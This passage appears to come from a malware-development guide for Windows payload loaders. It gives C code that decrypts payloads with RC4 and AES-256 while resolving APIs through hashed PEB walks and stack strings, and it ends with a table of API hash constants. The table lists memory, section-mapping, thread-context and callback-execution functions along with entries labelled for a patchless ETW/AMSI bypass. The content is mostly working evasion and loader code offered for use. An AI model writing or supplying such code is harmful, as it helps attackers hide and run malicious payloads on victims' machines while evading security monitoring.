    PVOID Buffer;
} USTRING;

void Rc4Decrypt(PBYTE pData, DWORD dwDataLen, PBYTE pKey, DWORD dwKeyLen) {
    // Load advapi32 for SystemFunction032
    wchar_t sAdv[] = { 'a','d','v','a','p','i','3','2','.','d','l','l',0 };
    PVOID hAdvapi32 = EnsureModule(HASH_ADVAPI32, sAdv);

    typedef NTSTATUS(WINAPI* fnSystemFunction032)(USTRING*, USTRING*);
    fnSystemFunction032 pSf032 =
        (fnSystemFunction032)PebGetProc(hAdvapi32, HASH_SystemFunction032);

    USTRING data = { dwDataLen, dwDataLen, pData };
    USTRING key  = { dwKeyLen,  dwKeyLen,  pKey  };

    pSf032(&data, &key);
}

// Usage:
// BYTE rc4Key[] = "MySecretRC4Key!!"; // 16 bytes
// Rc4Decrypt(encBuf, encLen, rc4Key, sizeof(rc4Key) - 1);
```

### AES-256-CBC (BCrypt via PEB walk)

```c
// AES-256-CBC decryption via BCrypt (bcrypt.dll)
void AesDecrypt(PBYTE pCiphertext, DWORD dwCipherLen,
                PBYTE pKey, DWORD dwKeyLen,    // 32 bytes for AES-256
                PBYTE pIV,  DWORD dwIVLen,     // 16 bytes
                PBYTE pPlaintext, PDWORD pdwPlainLen) {

    wchar_t sBcrypt[] = { 'b','c','r','y','p','t','.','d','l','l',0 };
    PVOID hBcrypt = EnsureModule(HASH_BCRYPT, sBcrypt);

    // Resolve BCrypt functions
    typedef NTSTATUS(WINAPI* fnBCryptOpenAlgorithmProvider)(
        PVOID*, LPCWSTR, LPCWSTR, ULONG);
    typedef NTSTATUS(WINAPI* fnBCryptSetProperty)(
        PVOID, LPCWSTR, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS(WINAPI* fnBCryptGenerateSymmetricKey)(
        PVOID, PVOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
    typedef NTSTATUS(WINAPI* fnBCryptDecrypt)(
        PVOID, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, PULONG, ULONG);
    typedef NTSTATUS(WINAPI* fnBCryptDestroyKey)(PVOID);
    typedef NTSTATUS(WINAPI* fnBCryptCloseAlgorithmProvider)(PVOID, ULONG);

    fnBCryptOpenAlgorithmProvider pOpen =
        (fnBCryptOpenAlgorithmProvider)PebGetProc(hBcrypt, HASH_BCryptOpenAlgorithmProvider);
    fnBCryptSetProperty pSetProp =
        (fnBCryptSetProperty)PebGetProc(hBcrypt, HASH_BCryptSetProperty);
    fnBCryptGenerateSymmetricKey pGenKey =
        (fnBCryptGenerateSymmetricKey)PebGetProc(hBcrypt, HASH_BCryptGenerateSymmetricKey);
    fnBCryptDecrypt pDecrypt =
        (fnBCryptDecrypt)PebGetProc(hBcrypt, HASH_BCryptDecrypt);
    fnBCryptDestroyKey pDestroyKey =
        (fnBCryptDestroyKey)PebGetProc(hBcrypt, HASH_BCryptDestroyKey);
    fnBCryptCloseAlgorithmProvider pClose =
        (fnBCryptCloseAlgorithmProvider)PebGetProc(hBcrypt, HASH_BCryptCloseAlgorithmProvider);

    // Stack strings for algorithm and chaining mode
    WCHAR sAes[] = { 'A','E','S',0 };
    WCHAR sChain[] = { 'C','h','a','i','n','i','n','g','M','o','d','e',0 };
    WCHAR sCBC[] = { 'C','h','a','i','n','i','n','g','M','o','d','e','C','B','C',0 };

    PVOID hAlg = NULL;
    pOpen(&hAlg, sAes, NULL, 0);
    pSetProp(hAlg, sChain, (PUCHAR)sCBC, sizeof(sCBC), 0);

    PVOID hKey = NULL;
    pGenKey(hAlg, &hKey, NULL, 0, pKey, dwKeyLen, 0);

    // Decrypt — IV is consumed (copy it if needed again)
    BYTE ivCopy[16];
    __movsb(ivCopy, pIV, dwIVLen);

    ULONG cbResult = 0;
    pDecrypt(hKey, pCiphertext, dwCipherLen, NULL,
             ivCopy, dwIVLen, pPlaintext, dwCipherLen, &cbResult, 0);
    *pdwPlainLen = cbResult;

    // Cleanup
    pDestroyKey(hKey);
    pClose(hAlg, 0);
}

// Usage:
// BYTE aesKey[32] = { ... };  // AES-256 key
// BYTE iv[16]     = { ... };  // IV
// BYTE plain[4096];
// DWORD plainLen = 0;
// AesDecrypt(encBuf, encLen, aesKey, 32, iv, 16, plain, &plainLen);
```

---

## Hash Constants Reference

```c
// Pre-computed djb2 hashes — verified values
// Module hashes (djb2 on uppercase Unicode name via PEB walk)
#define HASH_NTDLL          0x1EDAB0ED
#define HASH_KERNEL32       0x6DDB9555
#define HASH_CRYPT32        0x2E9BB986
#define HASH_GDI32          0x701206C8
#define HASH_USER32         0x2208CF13
#define HASH_ADVAPI32       0x64BB3129
#define HASH_BCRYPT         0xEDB54DA3
#define HASH_AMSI           0x668E2AF9

// NT API hashes (djb2 on ASCII function name)
#define HASH_NtAllocateVirtualMemory  0x6793C34C
#define HASH_NtProtectVirtualMemory   0x082962C8
#define HASH_NtCreateSection          0xD02E20D0
#define HASH_NtMapViewOfSection       0x231F196A
#define HASH_NtUnmapViewOfSection     0x595014AD
#define HASH_NtOpenFile               0xC29C5019
#define HASH_NtWaitForSingleObject    0x4C6DC63C
#define HASH_NtDelayExecution         0x0A49084A
#define HASH_LdrLoadDll               0x0307DB23
#define HASH_NtOpenSection            0x17CFA34E
#define HASH_NtGetContextThread       0x9E0E1A44
#define HASH_NtSetContextThread       0x308BE0D0
#define HASH_NtQueryInformationProcess 0xD034FC62
#define HASH_NtClose                  0x8B8E133D

// Win32 API hashes (djb2 on ASCII function name)
#define HASH_ConvertThreadToFiber     0xC1283AE9
#define HASH_CreateFiber              0xEB969BA1
#define HASH_SwitchToFiber            0xC2D09E02
#define HASH_CertEnumSystemStore      0xD95DA79A
#define HASH_EnumFontsW               0xC601BEDB
#define HASH_EnumSystemGeoID          0x190F8F87
#define HASH_GetDC                    0x0D3D24AC
#define HASH_ReleaseDC                0xE43871CD
#define HASH_TpAllocWork              0x35829537
#define HASH_TpPostWork               0xC94FC392
#define HASH_TpReleaseWork            0xCB60D48D
#define HASH_TpAllocWait              0x35825889
#define HASH_TpSetWait                0x70DDF58A
#define HASH_TpReleaseWait            0xCB6097DF
#define HASH_SystemFunction032        0xCCCF3585
#define HASH_LoadLibraryA             0x5FBFF0FB
#define HASH_EtwEventWrite            0x24A8D022
#define HASH_AmsiScanBuffer           0x29FCD18E
#define HASH_VirtualAlloc             0x382C0F97
#define HASH_VirtualProtect           0x844FF18D
#define HASH_GetTickCount             0x41AD16B9
#define HASH_QueryPerformanceCounter  0xDB4E150D
#define HASH_CreateEventW             0x5D01F1B2
#define HASH_SetEvent                 0x877EBBD3
#define HASH_UuidFromStringA          0xFB4FA7C8
#define HASH_RtlIpv4StringToAddressA  0x0BB2E39B
#define HASH_RtlEthernetStringToAddressA 0x62575497
#define HASH_BCryptOpenAlgorithmProvider 0x2A15DFDD
#define HASH_BCryptSetProperty        0xE9049EEA
#define HASH_BCryptGenerateSymmetricKey 0xA81D472A
#define HASH_BCryptDecrypt            0x690BA834
#define HASH_BCryptDestroyKey         0x7B16C8CC
#define HASH_BCryptCloseAlgorithmProvider 0xFCD0CDC1

// VEH APIs (for HBP patchless ETW/AMSI bypass)
#define HASH_AddVectoredExceptionHandler    0x37D1F0D7
#define HASH_RemoveVectoredExceptionHandler 0xC88FFB7C
```
